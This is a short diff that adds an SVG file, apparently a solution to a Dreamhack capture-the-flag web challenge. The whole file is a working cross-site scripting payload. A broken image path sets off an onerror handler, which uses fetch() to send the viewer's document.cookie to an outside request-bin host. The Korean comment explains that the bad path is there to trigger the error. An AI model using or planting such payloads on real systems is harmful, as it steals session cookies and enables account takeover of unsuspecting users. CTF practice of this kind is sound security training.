@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <!-- 존재하지 않는 이미지 경로로 에러를 발생시킵니다 -->
+  <image href="invalid" width="0" height="0"
+         onerror="fetch('https://pliwtnu.request.dreamhack.games?c='+document.cookie)"/>
+</svg>
